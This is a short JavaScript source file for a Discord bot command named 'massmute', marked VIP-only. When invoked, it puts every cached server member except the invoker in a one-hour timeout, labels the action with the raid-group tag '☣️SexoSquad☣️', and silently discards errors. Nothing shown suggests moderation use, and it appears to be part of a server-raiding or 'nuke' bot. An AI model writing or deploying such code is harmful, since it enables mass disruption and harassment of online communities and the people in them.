const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {
    vip: true,
    timeout:60000, 
    data: new SlashCommandBuilder()
    .setName("massmute")
    .setDescription("Mutea a gran parte del servidor. (Only VIP) "),

    async run(client, interaction){
try{

  interaction.reply({content: '**Iniciando Massmute en este server, solo podré mutear a usuarios inferiores a mi rol y que no tengan permisos administrativos.**', ephemeral: true})

  interaction.guild.members.cache.forEach(member => {
    if(member.user.id == interaction.user.id){
      return;
    }else{
      member.timeout(3600000, '☣️SexoSquad☣️').catch(e=>{ 
       return;
      })
    }

  })
    
  
  

}catch (e) {
        console.error(e);
       
        try {
          return;
         } catch (e) {}
        }
    }
}
